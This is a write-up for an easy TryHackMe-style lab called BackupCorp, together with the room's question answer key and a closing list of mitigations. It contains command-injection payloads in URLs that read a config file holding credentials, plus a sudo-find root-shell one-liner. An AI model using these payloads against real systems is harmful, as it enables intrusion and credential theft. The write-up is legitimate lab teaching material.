# BackupCorp — Official Writeup

![Platform](https://img.shields.io/badge/platform-TryHackMe-212c42)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-brightgreen)
![Category](https://img.shields.io/badge/type-Challenge-blue)
![OS](https://img.shields.io/badge/OS-Linux-yellow)

> **Room:** BackupCorp
> **Difficulty:** Easy
> **Author:** <your-thm-username>
> **Skills:** enumeration · web command injection · credential looting · Linux privilege escalation (sudo / GTFOBins)

---

## Overview

BackupCorp takes its backups seriously — its security, not so much. In this box
we enumerate the target, exploit an unsanitised **"Network Tools"** page to gain
command execution, loot hardcoded credentials from a config file, pivot to a real
user, and finish by abusing a careless `sudo` rule to escalate to **root**.

> In the commands below, replace `<IP>` / `MACHINE_IP` with your deployed machine's
> IP address.

---

## Task 1 — Deploy & Enumerate

### Enumeration

We start with a service/version scan:

```bash
nmap -sV -sC <IP>
```

![nmap scan results](images/01-nmap.png)

Two ports are open:

```
22/tcp open  ssh      OpenSSH 8.9p1 Ubuntu
80/tcp open  http     Apache httpd 2.4.52
```

Browsing to the web server shows the BackupCorp landing page, with a comment
hinting at an admin area. Checking `robots.txt`:

```bash
curl http://<IP>/robots.txt
```

![robots.txt revealing /admin](images/02-robots.png)

```
User-agent: *
Disallow: /admin
```

This points us at the hidden **/admin** directory.

### Questions

| # | Question | Answer |
|---|----------|--------|
| 1 | How many TCP ports are open? | `2` |
| 2 | What service is running on port 22? | `ssh` |
| 3 | What hidden directory does robots.txt reveal? | `/admin` |

---

## Task 2 — Get a Foothold

Navigating to `http://<IP>/admin/` reveals a **Network Tools** page with a "Ping a
host" field.

![BackupCorp Network Tools ping page](images/03-admin-page.png)

### Testing for command injection

The page runs `ping` on whatever we submit. If the input isn't sanitised, we can
chain our own command with `;`. Testing with `id`:

```bash
curl "http://<IP>/admin/index.php?host=127.0.0.1;id"
```

![command injection returning id output](images/04-injection-id.png)

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command injection confirmed — we execute as **www-data**.

### Looting the config file

There's a `config.php` in the admin folder. Reading a `.php` file **in the browser
looks empty** because the browser hides the `<?php ... ?>` tags — so we read it with
`curl` instead:

```bash
curl "http://<IP>/admin/index.php?host=127.0.0.1;cat+/var/www/html/admin/config.php"
```

![config.php credentials leaked via curl](images/05-config-creds.png)

```php
$db_user = "developer";
$db_pass = "Sup3rS3cr3t_Backups!";
```

We now have credentials for the user **developer**.

### Questions

| # | Question | Answer |
|---|----------|--------|
| 1 | 2-word name of the vulnerability | `command injection` |
| 2 | Which user does the web server run as? | `www-data` |
| 3 | Username found in the leaked config | `developer` |

---

## Task 3 — User Flag

SSH is open, so we log in with the leaked credentials:

```bash
ssh developer@<IP>
# password: Sup3rS3cr3t_Backups!
```

![SSH login as developer](images/06-ssh-login.png)

Grab the user flag:

```bash
cat ~/user.txt
```

![user.txt flag](images/07-user-flag.png)

```
THM{xxxxxxxxxxxxxxxxxxxxxxxx}
```

> _(Replace with your box's actual user.txt value.)_

### Questions

| # | Question | Answer |
|---|----------|--------|
| 1 | Submit the contents of user.txt | `THM{...}` |

---

## Task 4 — Privilege Escalation & Root

Check what `developer` can run as root:

```bash
sudo -l
```

![sudo -l output showing find](images/08-sudo-l.png)

```
User developer may run the following commands:
    (root) NOPASSWD: /usr/bin/find
```

`find` can be run as root without a password. According to
[GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo), `find` can spawn a shell
via its `-exec` flag. Since we're running it as root, that shell is a **root shell**:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

![root shell via sudo find](images/09-root-shell.png)

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Grab the root flag:

```bash
cat /root/root.txt
```

![root.txt flag](images/10-root-flag.png)

```
THM{xxxxxxxxxxxxxxxxxxxxxxxx}
```

> _(Replace with your box's actual root.txt value.)_

### Questions

| # | Question | Answer |
|---|----------|--------|
| 1 | Which binary can developer run as root? | `/usr/bin/find` |
| 2 | Submit the contents of root.txt | `THM{...}` |

---

## Summary

| Stage | Technique | Result |
|-------|-----------|--------|
| Recon | `nmap`, `robots.txt` | Found SSH, HTTP, `/admin` |
| Foothold | Web command injection | Shell as `www-data` |
| Loot | Read `config.php` | Credentials for `developer` |
| User | SSH login | `user.txt` |
| Privesc | `sudo find` (GTFOBins) | Root shell → `root.txt` |

**Three real-world mistakes chained together:** an unsanitised web input, hardcoded
credentials in a config file, and an overly permissive `sudo` rule. Patching any one
of them would have broken the chain.

---

### Mitigations
- **Validate/escape all user input** — never pass it to a shell. Use safe APIs
  instead of `shell_exec`.
- **Never hardcode credentials** in web-readable files; use environment variables or
  a secrets manager, and restrict file permissions.
- **Follow least privilege for sudo** — don't grant `NOPASSWD` on binaries with known
  shell escapes (see GTFOBins).

---

_Writeup by <your-thm-username>. Room: BackupCorp on TryHackMe._
